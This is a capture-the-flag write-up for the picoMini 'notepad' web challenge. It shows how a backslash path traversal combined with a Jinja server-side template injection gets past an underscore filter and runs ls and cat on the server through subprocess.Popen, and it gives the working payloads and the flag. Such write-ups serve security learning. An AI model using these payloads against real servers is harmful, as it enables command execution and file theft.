---
title: picoMini by redpwn 2021 - notepad (web)
date: 2021-05-12
slug: /writeups/picomini-redpwn-notepad
excerpt: Writeup for notepad (web)
author: Diana Lin
---

Notepad was a web exploitation challenge from picoMini by redpwn 2021.

# Description
> This note-taking site seems a bit off.
>
> notepad.mars.picoctf.net

Files:
* [notepad.tar](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/notepad/notepad.tar)

The application is a simple note-taking site. When a new note is created, a file in the static folder is created, and the client is redirected to the file.

# Directory Traversal
We were provided a source so I checked that out. I first noticed the filters on the note's `content`.
```py
if "_" in content or "/" in content:
    return redirect(url_for("index", error="bad_content"))
```

The filter on `/` indicates that path traversal should be prevented. However, the created file's `name` looks odd.
```py
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
```

The filename is the first 128 characters of the content and a random token. It's a bit weird that they're normalizing the path with `url_fix(content[:128])`; that's our first vulnerability. Even though `/` is filtered, `\` is not, and `url_fix()` would normalize the backslashes to be `/`. We could use this to traverse the filesystem.

# Arbitrary Template Creation
Remember that error from the filter on `content`? That comes in handy now. On the index page, the error can be set to any arbitrary value by simply passing in another value to the `error` query parameter:
```
https://notepad.mars.picoctf.net/?error=error_name
```

This value is then used as the filename for a Jinja template in the `errors` subdirectory.
```html
{% if error is not none %}
  <h3>
    error: {{ error }}
  </h3>
  {% include "errors/" + error + ".html" ignore missing %}
{% endif %}
```

How is this useful? Well, we can create our own error template by using our path traversal technique to create a file in the `templates/errors` folder. This new template can then be rendered on the index page if we pass it in as a query parameter.

We can test a sample payload now:
```
..\\templates\\errors\\
```

If we paste that into the text area on the index page and submit, we get redirected to a `Not Found` error page. Not to worry! Since we wrote to a file outside of the static folder, we can't access it from `/static/...`, which resulted in the 404. However, we can check out our payload by passing our filename (minus extension) into `error`. The path I got redirected to was `///templates//errors//-7-kh4_p7dTY.html` so I went to:
```
https://notepad.mars.picoctf.net/?error=-7-kh4_p7dTY
```

Lo and behold, our payload was printed back to us!

# SSTI Injection
Since the error page is included as a Jinja template and not as a static page, we can utilize a server-side template injection to retrieve the flag. I found a great [reference](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) that detailed how to implement a SSTI injection with the Jinja template engine.

After the path of the `errors` folder, I padded the payload with `a` characters so that none of the injection was stored in the filename. While this is optional, I found that it made the request much cleaner because the filename isn't url encoded.

The next step is to find the `string` class. This is usually done with `''.__class__` but because of the filter on underscores, we can't insert `__class__` directly into the `content` parameter. We can, however, insert it into a different query parameter and reference it that way. We can then get the string class's [method resolution order](https://www.geeksforgeeks.org/method-resolution-order-in-python-inheritance/) using `mro()`.

The second class in the `string` class's MRO is the `object` class so we can index to 1.
```py
[<class 'str'>, <class 'object'>]
```

If we call `object.__subclasses__()`, we can access all the classes that are available. Since underscores are filtered, we can access the function the same way we accessed `__class__`. Our full payload is now:
```py
p = "..\\templates\\errors\\" + "a" * 128 + "{{ ''[request.args.get('class')].mro()[1][request.args.get('subclasses')]() }}"
```

When we access the index page with the filename passed into `error`, we get an internal server error. This is because we didn't pass in the `class` or `subclasses` query parameters. After setting them to `__class__` and `__subclasses__`, respectively, [a whole bunch of stuff is rendered](https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-oiv7lSJ0KoY&class=__class__&subclasses=__subclasses__).

Nice! We got a whole bunch of classes from that. The most important of those is `subprocess.Popen`. To find the index of that class more easily, I pasted the stringified list into a Python shell (as a string), split the list on `, `, and called `l.index(" <class 'subprocess.Popen'>")` to find that the `subprocess.Popen` class is at index 273. That means that we can create a new `Popen` object to execute some pretty useful commands.

The provided Dockerfile showed that the flag is located in the app's root directory with a random UUID appended to it. Therefore, we need to find the flag's filename; we can `ls` the root directory and return the result with this injection:
```py
{{ ''[request.args.get('class')][request.args.get('mro')][1][request.args.get('subclasses')]()[273](['ls'], stdout=-1).communicate() }}
```

The flag's filename is `flag-c8f5526c-4122-4578-96de-d7dd27193798.txt`. Last but not least, we can `cat` the flag:
```py
{{ ''[request.args.get('class')][request.args.get('mro')][1][request.args.get('subclasses')]()[273](['cat', 'flag-c8f5526c-4122-4578-96de-d7dd27193798.txt'], stdout=-1).communicate() }}
```

# Flag
```
picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
```